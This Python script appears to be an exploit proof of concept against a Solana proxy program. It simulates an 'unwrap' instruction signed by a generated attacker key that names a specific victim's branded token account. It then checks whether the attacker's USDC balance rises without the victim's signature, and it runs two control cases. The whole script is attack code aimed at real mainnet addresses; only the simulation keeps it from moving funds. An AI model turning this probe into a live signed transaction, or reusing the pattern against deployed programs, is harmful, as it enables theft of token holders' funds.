#!/usr/bin/env python3
"""Probe unwrap with the account layout inferred from the real Claim Fees tx."""
import json, base64, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solrpc import rpc
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction
from solders.hash import Hash
from solders.signature import Signature

P = Pubkey.from_string
PROXY = P("pRoxYU64BSjv8HbhENna8a7LVCrkzzNrnvbYuTwas8C")
TOKEN = P("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
ATA_PROG = P("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
SYSTEM = P("11111111111111111111111111111111")
PS0 = P("FD4YydhzPpSmXwnHsX1oJBE4er4m9mg4ezaBN9cXgQbz")
VAULT0 = P("E5ohyMVkBTdn3DekUPcFyLFF2Wi78Rg3Mt9QQDWgN5Mp")
BMINT = P("sro4agJ6nJ89MJgj2DfDdx8zXVqSyZfCZjbhBfQaJU5")
ORACLE = P("GWdwWDhYFUc8ZD6uCTtEAAwx97V1ZCsxPWGL7vhSha6w")
CFG = P("V8eHEsRUBcxpkYZN2jhjYLzJFhbWbFvpNJYBp1YHNar")
USDCP = P("AvZZF1YaZDziPY2RCK4oJrRVrbN3mTD9NL24hPeaZeUj")
VICTIM = P("7cfj48Ym6zsu8WfPtDrU3ERw4Y1WxRzrqd9gF7KrWiJv")
VICTIM_OWNER = P("GwJuWxL4GD38XnAa1d3ZdhAWRupnwgqavCqovpL4aTo8")
ATTACKER = Pubkey.new_unique()

def ata(mint, owner):
    return Pubkey.find_program_address([bytes(owner), bytes(TOKEN), bytes(mint)], ATA_PROG)[0]

def sim(ix, label, payer):
    msg = Message.new_with_blockhash([ix], payer, Hash.default())
    tx = Transaction.populate(msg, [Signature.default()] * msg.header.num_required_signatures)
    raw = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction", [raw, {"encoding": "base64", "sigVerify": False,
                                          "replaceRecentBlockhash": True, "commitment": "processed"}])
    v = (r.get("result") or {}).get("value") or {}
    err = json.dumps(v.get("err")) if v.get("err") else None
    print(f"{label:60} err={err} units={v.get('unitsConsumed')}")
    for b in (v.get("postTokenBalances") or []):
        if b.get("owner") == str(ATTACKER):
            print("    ATTACKER post balance:", b.get("mint"), b.get("uiTokenAmount", {}).get("uiAmountString"))
    return v

data = bytes([2]) + (1000000).to_bytes(8, "little") + (0).to_bytes(8, "little")
order = [ATTACKER, ata(USDCP, ATTACKER), VICTIM, PS0, VAULT0, BMINT, ORACLE, CFG, TOKEN, USDCP]
sim(Instruction(PROXY, data, [AccountMeta(k, i == 0, i != 0) for i, k in enumerate(order)]),
    "unwrap(10): user,usdc_user,victim_branded,state,vault,bmint,oracle,cfg,token,usdc+", ATTACKER)

# control: real owner of the branded account signs
order2 = [VICTIM_OWNER, ata(USDCP, VICTIM_OWNER), VICTIM, PS0, VAULT0, BMINT, ORACLE, CFG, TOKEN, USDCP]
sim(Instruction(PROXY, data, [AccountMeta(k, i == 0, i != 0) for i, k in enumerate(order2)]),
    "unwrap(10) control: owner signs", VICTIM_OWNER)

# control 2: attacker signs, but the branded account is the attacker's own (nonexistent)
order3 = [ATTACKER, ata(USDCP, ATTACKER), ata(BMINT, ATTACKER), PS0, VAULT0, BMINT, ORACLE, CFG, TOKEN, USDCP]
sim(Instruction(PROXY, data, [AccountMeta(k, i == 0, i != 0) for i, k in enumerate(order3)]),
    "unwrap(10): attacker's own branded acct (does not exist)", ATTACKER)
